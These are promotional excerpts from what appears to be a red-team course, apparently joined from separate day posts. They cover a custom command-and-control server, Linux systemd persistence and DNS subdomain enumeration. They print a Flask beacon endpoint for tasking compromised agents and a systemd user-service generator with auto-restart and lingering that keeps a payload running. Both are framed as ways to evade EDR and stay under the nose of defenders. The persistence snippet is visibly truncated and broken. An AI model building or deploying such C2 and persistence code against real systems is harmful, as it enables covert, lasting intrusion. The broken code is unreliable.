<p data-path-to-node="11">You have spent two days ensuring your malware survives a reboot. But here is the brutal truth: if your reverse shell dies and you have no way to reconnect, you are dead in the water.</p>
<p data-path-to-node="12">Commercial tools like Cobalt Strike and Metasploit are powerful, but they have a fatal flaw: <strong data-path-to-node="12" data-index-in-node="93">Signatures.</strong> Every EDR on the planet knows what they look like.</p>
<p data-path-to-node="13">Today, we stop relying on other people's tools. We are building a <strong data-path-to-node="13" data-index-in-node="66">Custom Command &amp; Control (C2)</strong> infrastructure from scratch. It has no signatures, it uses custom encryption, and it is the only way to operate under the nose of a hunting team.</p>
<hr>
<h3 data-path-to-node="15"><strong data-path-to-node="15" data-index-in-node="0">A Glimpse of the Code: The C2 Brain</strong></h3>
<p data-path-to-node="16">A C2 server needs to be more than just a listener; it needs to be a task manager.</p>
<p data-path-to-node="17">In Day 10, we build a Flask-based server that handles encrypted "Beacons" from our agents. Here is the core logic that processes a check-in without alerting the firewall:</p>
<pre class="language-python"><code>@self.app.route('/api/v1/sync', methods=['POST'])
def beacon():
    """
    Handle agent beacon check-ins.
    1. Decrypts the incoming heartbeat.
    2. Identifies the session (Window/Linux).
    3. Checks the database for pending commands (Tasks).
    """
    encrypted = request.json.get('data')
    payload = self.decrypt_data(encrypted)
    
    if not payload:
        return jsonify({'status': 'error'}), 400
    
    # Get pending tasks for this agent
    tasks = self.get_pending_tasks(payload.get('session_id'))
    
    return jsonify({
        'status': 'success',
        'data': self.encrypt_data({'tasks': tasks})
    })</code></pre>
<p>This architecture separates the "Brains" (Server) from the "Muscle" (Agent), allowing you to manage hundreds of compromised systems simultaneously.</p>

<p data-path-to-node="11">Yesterday, we hid inside the Windows Registry. Today, we enter the world of Linux, where "everything is a file"—including your malware.</p>
<p data-path-to-node="12">If you think Linux persistence is just adding a Cron job and calling it a day, you are going to get caught. Modern Linux environments (especially in the cloud) are heavily monitored. To survive reboots and <code data-path-to-node="12" data-index-in-node="206">rm -rf</code> commands, you need to understand the boot process better than the sysadmin does.</p>
<p data-path-to-node="13">Today, we cover the art of staying root.</p>

<p data-path-to-node="16">Cron is noisy. <strong data-path-to-node="16" data-index-in-node="15">Systemd</strong> is professional.</p>
<p data-path-to-node="17">Systemd manages services on almost every modern Linux distro. By creating a custom user service, we can ensure our payload restarts automatically if it crashes or is killed. Here is the logic from the <strong data-path-to-node="17" data-index-in-node="201">Systemd Persistence Tool</strong> we build in the full article:</p>
<pre class="language-python"><code>def create_user_service(service_name, payload_command):

After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{payload_command}'
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
    # Write to ~/.config/systemd/user/ and enable lingering
    # "Lingering" ensures the service runs even when the user is logged out.
    subprocess.run(f'loginctl enable-linger {os.getenv("USER")}', shell=True)</code></pre>
<p>This technique allows your persistence to survive even when the user logs out, effectively turning a low-privilege user account into a permanent foothold.</p>

<p data-path-to-node="12">They teach the Cyber Kill Chain as a linear, orderly process: <i data-path-to-node="12" data-index-in-node="62">Recon → Weaponize → Deliver → Win.</i></p>
<p data-path-to-node="13">But real-world Red Teaming is messy. It’s non-linear. You gain access, you hit a wall, you re-recon, you pivot, and you try again.</p>
<p data-path-to-node="14">In <strong data-path-to-node="14" data-index-in-node="3">Day 1</strong>, we stop treating the Kill Chain like a vocabulary list and start using it as an operational roadmap. If you don't understand this framework, you aren't a Red Teamer—you're just a script kiddie flailing in the dark.</p>

<h3 data-path-to-node="16"><strong data-path-to-node="16" data-index-in-node="0">A Glimpse of the Code: Automating Reconnaissance</strong></h3>
<p data-path-to-node="17">We aren't just covering theory. In Day 1, we start building your personal toolkit immediately.</p>
<p data-path-to-node="18">Finding subdomains is the first step in mapping an attack surface. Why? Because <code data-path-to-node="18" data-index-in-node="80">dev.target.com</code> usually has weaker security than <code data-path-to-node="18" data-index-in-node="128">www.target.com</code>.</p>
<p data-path-to-node="19">Here is a snippet of the custom <strong data-path-to-node="19" data-index-in-node="32">DNS Enumerator</strong> we build in the full article:</p>
<pre class="language-python"><code>def enumerate_subdomains(domain, wordlist):
    """
    Enumerate subdomains using DNS queries
    """
    found_subdomains = []
    
    with open(wordlist, 'r') as f:
        subdomains = f.read().splitlines()
    
    for subdomain in subdomains:
        test_domain = f"{subdomain}.{domain}"
        try:
            answers = dns.resolver.resolve(test_domain, 'A')
            for rdata in answers:
                print(f"[+] Found: {test_domain} -&gt; {rdata}")
                found_subdomains.append(test_domain)
        except dns.resolver.NXDOMAIN:
            pass  # Subdomain doesn't exist
        except Exception as e:
            pass  # Other DNS errors
    
    return found_subdomains</code></pre>
<p>This simple logic allows us to find the hidden doors into an organization's network. But finding them is only Step 1.</p>
